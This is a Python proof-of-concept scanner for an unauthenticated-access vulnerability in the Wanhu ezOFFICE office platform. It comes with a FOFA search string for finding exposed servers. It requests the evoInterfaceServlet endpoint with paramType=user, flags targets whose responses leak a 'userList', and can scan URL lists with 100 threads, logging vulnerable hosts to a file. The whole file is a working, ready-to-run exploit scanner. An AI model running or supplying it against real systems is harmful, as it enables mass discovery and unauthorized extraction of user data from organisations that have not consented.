#-*- coding: utf-8 -*-
import argparse,sys,requests,time,os,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
#fofa：app="万户网络-ezOFFICE"
def banner():
    test = """
 _       ____  __                 ____  ____________________________
| |     / / / / /     ___  ____  / __ \/ ____/ ____/  _/ ____/ ____/
| | /| / / /_/ /_____/ _ \/_  / / / / / /_  / /_   / // /   / __/   
| |/ |/ / __  /_____/  __/ / /_/ /_/ / __/ / __/ _/ // /___/ /___   
|__/|__/_/ /_/      \___/ /___/\____/_/   /_/   /___/\____/_____/                                                                                                                                                                                                                                                                                                                        
                        tag:  万户协同办公平台未授权访问漏洞 POC                                     
                            @version: 1.0.0   @author by gallopsec            
"""
    print(test)
headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
        }
def poc(target):
    url = target+"/defaultroot/evoInterfaceServlet?paramType=user"
    try:
        res = requests.get(url,headers=headers,timeout=5,verify=False).text
        if '"userList"' in res:
            print(f"[+] {target} is vulable")
            with open("request.txt", "a+", encoding="utf-8") as f:
                f.write(url+"\n")
            return True
        else:
            print(f"[-] {target} is not vulable")
            return False
    except:
        print(f"[*] {target} error")
        return False


def main():
    banner()
    parser = argparse.ArgumentParser(description='WH-ezOFFICE POC')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()